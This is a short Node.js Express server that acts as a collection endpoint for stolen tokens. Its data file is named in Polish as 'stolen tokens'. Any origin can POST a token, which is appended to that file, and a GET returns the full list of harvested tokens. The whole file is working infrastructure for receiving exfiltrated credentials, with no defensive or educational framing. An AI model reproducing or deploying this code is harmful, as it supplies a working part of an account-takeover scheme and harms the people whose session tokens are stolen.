const fs = require('fs');
const express = require('express')
const cors = require('cors')
const app = express()
const tokeny = require("./wykradzione_tokeny.json")

app.use(express.json());
app.use(cors())

app.post('/', (req, res) => {
    let token = req.body.token;

    fs.readFile("./wykradzione_tokeny.json", "utf8", (error, data) => {
        if (error) {
          console.log(error);
          return;
        }
        let tokeny = JSON.parse(data);
        tokeny.push(token);

        fs.writeFile("./wykradzione_tokeny.json", JSON.stringify(tokeny), (error) => {
            if (error) {
              console.log('An error has occurred ', error);
              return;
            }
            res.send(tokeny);
          });
      });

});

app.get('/', (req, res) => {
    res.send(tokeny);
});

app.listen(3000, '192.168.1.100');